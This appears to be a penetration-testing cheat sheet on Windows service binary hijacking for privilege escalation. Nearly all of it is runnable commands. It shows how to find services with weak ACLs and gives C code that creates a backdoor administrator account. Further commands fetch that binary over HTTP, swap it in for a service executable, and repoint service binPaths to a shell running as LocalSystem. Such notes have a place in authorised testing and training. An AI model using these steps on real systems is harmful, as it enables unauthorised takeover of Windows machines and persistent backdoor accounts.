---
title: Service Binary Hijacking
category: privesc
subcategory: windows-services
os: windows
command: icacls "C:\path\to\service.exe"
tools: icacls, Get-CimInstance, sc
---


### Find running services

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

### Check ACL on the service binary

```cmd
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

ACL legend: `F` full, `M` modify, `RX` read+execute, `R` read, `W` write.

### Drop a malicious add-user binary in C and compile

```c
#include <stdlib.h>

int main () {
    int i;
    i = system ("net user dave2 password123! /add");
    i = system ("net localgroup administrators dave2 /add");
    return 0;
}
```

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

### Replace and restart

```powershell
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
net stop mysql
net start mysql
```

### Verify autostart

```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

### Reconfigure binPath via sc.exe

```cmd
sc.exe config VMTools binPath="C:\Users\aarti\Documents\shell.exe"
sc.exe stop VMTools
sc.exe start VMTools
```

### Reconfigure with the LocalSystem account

```cmd
sc config UPNPHOST binpath= "C:\Tools\sirenMaint.exe"
sc config UPNPHOST obj= ".\LocalSystem" password= ""
sc config SSDPSRV binpath= "C:\inetpub\siren\sirenMaint.exe"
sc config SSDPSRV obj= ".\LocalSystem" password= ""
sc config SSDPSRV start= "demand"
net stop SSDPSRV
net start SSDPSRV
```
